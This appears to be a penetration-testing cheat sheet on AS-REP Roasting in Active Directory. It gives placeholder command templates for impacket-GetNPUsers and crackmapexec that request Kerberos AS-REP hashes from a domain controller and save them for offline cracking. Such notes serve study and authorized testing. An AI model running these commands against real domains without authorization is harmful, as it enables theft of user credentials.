# AS-REP Roasting
If a domain user does not have Kerberos preauthentication 'DONT_REQ_PREAUTH' enabled, an AS-REP can be successfully requested for the user. Getting a TGT.
`impacket-GetNPUsers '<DOMAIN>/' -dc-ip <IP> -usersfile <USERLIST> -no-pass` (Users from file)
`impacket-GetNPUsers '<DOMAIN>/<USRE>:<PASS>' -request -outputfile HASH` (All from domain)
`crackmapexec ldap <IP> -u '<USER>' -p '<PASS>' --asreproast <OUTPUT.TXT>`

Check output & dc-ip & request